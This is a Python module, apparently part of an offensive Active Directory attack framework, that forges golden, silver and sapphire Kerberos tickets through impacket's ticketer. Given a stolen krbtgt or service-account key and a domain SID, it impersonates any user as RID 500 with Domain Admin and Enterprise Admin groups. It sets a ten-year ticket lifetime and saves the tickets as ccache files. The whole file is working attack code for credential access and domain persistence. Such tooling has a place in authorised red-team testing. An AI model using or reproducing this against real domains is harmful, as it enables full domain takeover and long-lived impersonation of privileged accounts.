"""Ticket forging — golden / silver / sapphire tickets.

Wraps impacket's ticketer building blocks. Produces a ccache in the
session vault. Requires the target account's NT/AES key (krbtgt for
golden, service account for silver).
"""

from __future__ import annotations

import json
import os
from typing import Any

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.impacket_helper import require_impacket
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


@register_capability(
    id="ticket-forge",
    summary="Forge golden / silver / sapphire Kerberos tickets from krbtgt / service key",
    category="credential-access",
    tags=("kerberos", "golden-ticket", "silver-ticket", "sapphire-ticket", "forgery"),
    destructive=False,
)
class TicketForge:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_impacket("ticket-forge")
        variant = str(kwargs.get("variant", "golden")).lower()
        impersonate = kwargs.get("impersonate") or kwargs.get("sam")
        if not impersonate:
            raise RuntimeError("Pass -P impersonate=<user> (the account to embed in PAC).")
        nt_hash = kwargs.get("nt") or kwargs.get("nthash")
        aes_key = kwargs.get("aes") or kwargs.get("aes_key")
        if not nt_hash and not aes_key:
            raise RuntimeError("Provide -P nt=<krbtgt-nt-hash> or -P aes=<aes256-hex>.")
        spn = kwargs.get("spn")
        if variant == "silver" and not spn:
            raise RuntimeError("Silver tickets require -P spn=<service/host@domain>.")
        domain_sid = kwargs.get("domain_sid")
        if not domain_sid:
            raise RuntimeError("Pass -P domain_sid=<S-1-5-21-...> (from ldap-enum output).")
        groups = str(kwargs.get("groups", "513,512,520,518,519")).split(",")

        console.print(
            f"[bold]ticket-forge[/bold] variant={variant} impersonate={impersonate} spn={spn or '-'}"
        )

        from impacket.examples.ticketer import TICKETER

        options = _TicketerOptions(
            target=impersonate,
            spn=spn,
            nthash=nt_hash,
            aesKey=aes_key,
            domain=target.domain,
            domain_sid=domain_sid,
            groups=",".join(groups),
            user_id="500",
            duration="87600",
            extra_sid=kwargs.get("extra_sid", ""),
            extra_pac=variant == "sapphire",
            request=False,
            impersonate=None,
            keytab=None,
            old_pac=False,
        )

        out_dir = session.path("tickets")
        os.makedirs(out_dir, exist_ok=True)
        previous_cwd = os.getcwd()
        os.chdir(out_dir)
        try:
            forger = TICKETER(impersonate, target.password or "", target.domain, options)
            forger.run()
        finally:
            os.chdir(previous_cwd)

        artifacts: list[str] = []
        for name in os.listdir(out_dir):
            if name.endswith(".ccache"):
                artifacts.append(str(out_dir / name))

        node = f"USER@{impersonate.upper()}@{target.domain.upper()}"
        graph.add_node(node, "User", sam=impersonate, forged_ticket=variant)
        graph.add_edge(node, node, "HasForgedTicket", variant=variant)

        result = {
            "variant": variant,
            "impersonate": impersonate,
            "spn": spn,
            "domain": target.domain,
            "domain_sid": domain_sid,
            "ccache_paths": artifacts,
        }
        out = session.path("ticket-forge.json")
        out.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log(
            "ticket-forge.complete",
            variant=variant,
            impersonate=impersonate,
            ccache_count=len(artifacts),
        )
        console.print(f"[green]Done[/green]  ccache={len(artifacts)}")
        return result


class _TicketerOptions:
    """Tiny stand-in for argparse Namespace expected by impacket TICKETER."""

    def __init__(self, **kw: Any) -> None:
        for key, val in kw.items():
            setattr(self, key, val)
